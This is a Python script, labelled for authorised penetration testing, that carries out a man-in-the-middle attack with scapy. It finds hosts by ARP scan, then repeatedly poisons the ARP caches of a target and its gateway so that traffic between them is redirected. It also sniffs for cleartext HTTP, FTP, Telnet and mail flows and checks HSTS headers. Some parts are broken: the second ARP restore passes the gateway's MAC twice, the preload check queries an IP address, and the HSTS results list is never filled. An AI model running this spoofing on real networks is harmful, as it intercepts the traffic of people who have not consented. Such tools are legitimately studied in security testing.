#!/usr/bin/env python3
# For authorized penetration testing and lab environments only
"""MITM Attack Simulation Agent - Tests network defenses against ARP spoofing and traffic interception."""

import json
import logging
import argparse
import subprocess
from datetime import datetime

from scapy.all import ARP, Ether, srp, send, sniff, IP, TCP, get_if_hwaddr, conf

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)


def get_mac(ip_address):
    """Resolve MAC address for an IP using ARP request."""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=3, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


def discover_hosts(network_cidr):
    """Discover live hosts on the network via ARP scan."""
    arp_request = ARP(pdst=network_cidr)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=5, verbose=False)
    hosts = []
    for sent, received in answered:
        hosts.append({"ip": received.psrc, "mac": received.hwsrc})
    logger.info("Discovered %d hosts on %s", len(hosts), network_cidr)
    return hosts


def arp_spoof(target_ip, spoof_ip, target_mac):
    """Send ARP spoofing packet to redirect traffic."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def arp_restore(target_ip, gateway_ip, target_mac, gateway_mac):
    """Restore original ARP tables after test."""
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=5, verbose=False)
    logger.info("ARP tables restored for %s", target_ip)


def detect_cleartext_protocols(interface, duration=30):
    """Sniff traffic for cleartext protocol usage (HTTP, FTP, Telnet, SMTP)."""
    cleartext_ports = {80: "HTTP", 21: "FTP", 23: "Telnet", 25: "SMTP", 110: "POP3", 143: "IMAP"}
    findings = []

    def packet_callback(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            dport = pkt[TCP].dport
            sport = pkt[TCP].sport
            for port, proto in cleartext_ports.items():
                if dport == port or sport == port:
                    findings.append({
                        "protocol": proto,
                        "src": pkt[IP].src,
                        "dst": pkt[IP].dst,
                        "port": port,
                    })

    logger.info("Sniffing for cleartext protocols on %s for %ds", interface, duration)
    sniff(iface=interface, prn=packet_callback, timeout=duration, store=False)
    unique = {f"{f['protocol']}:{f['src']}:{f['dst']}" for f in findings}
    logger.info("Detected %d cleartext protocol flows", len(unique))
    return findings


def check_hsts_enforcement(target_url):
    """Check if a target enforces HSTS headers."""
    import requests
    try:
        resp = requests.get(target_url, timeout=10, verify=False)
        hsts = resp.headers.get("Strict-Transport-Security", "")
        return {
            "url": target_url,
            "hsts_present": bool(hsts),
            "hsts_value": hsts,
            "vulnerable": not bool(hsts),
        }
    except Exception as e:
        return {"url": target_url, "error": str(e)}


def test_ssl_stripping_potential(target_ip, gateway_ip):
    """Evaluate if SSL stripping is feasible by checking HSTS preload status."""
    import requests
    try:
        resp = requests.get(
            f"https://hstspreload.org/api/v2/status?domain={target_ip}",
            timeout=10,
        )
        if resp.status_code == 200:
            data = resp.json()
            return {
                "target": target_ip,
                "preloaded": data.get("status") == "preloaded",
                "ssl_strip_feasible": data.get("status") != "preloaded",
            }
    except Exception:
        pass
    return {"target": target_ip, "preloaded": False, "ssl_strip_feasible": True}


def run_mitm_simulation(target_ip, gateway_ip, interface, duration=30):
    """Run a controlled MITM simulation with ARP spoofing and cleartext detection."""
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        logger.error("Could not resolve MAC addresses")
        return None

    logger.info("Starting MITM simulation: target=%s gateway=%s", target_ip, gateway_ip)
    results = {"target": target_ip, "gateway": gateway_ip, "target_mac": target_mac}

    try:
        for _ in range(duration):
            arp_spoof(target_ip, gateway_ip, target_mac)
            arp_spoof(gateway_ip, target_ip, gateway_mac)
            __import__("time").sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        arp_restore(target_ip, gateway_ip, target_mac, gateway_mac)
        arp_restore(gateway_ip, target_ip, gateway_mac, gateway_mac)

    results["status"] = "completed"
    return results


def generate_report(hosts, cleartext, hsts_results, simulation):
    """Generate MITM assessment report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "hosts_discovered": hosts,
        "cleartext_protocols": cleartext,
        "hsts_checks": hsts_results,
        "simulation_results": simulation,
    }
    print(json.dumps(report, indent=2))
    return report


def main():
    parser = argparse.ArgumentParser(description="MITM Attack Simulation Agent")
    parser.add_argument("--network", help="Network CIDR for host discovery (e.g., 192.168.1.0/24)")
    parser.add_argument("--target", help="Target IP for MITM simulation")
    parser.add_argument("--gateway", help="Gateway IP")
    parser.add_argument("--interface", default="eth0", help="Network interface")
    parser.add_argument("--duration", type=int, default=30, help="Sniff duration in seconds")
    parser.add_argument("--output", default="mitm_report.json")
    args = parser.parse_args()

    hosts = discover_hosts(args.network) if args.network else []
    cleartext = detect_cleartext_protocols(args.interface, args.duration)

    hsts_results = []
    simulation = None

    if args.target and args.gateway:
        simulation = run_mitm_simulation(args.target, args.gateway, args.interface, args.duration)

    report = generate_report(hosts, cleartext, hsts_results, simulation)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()
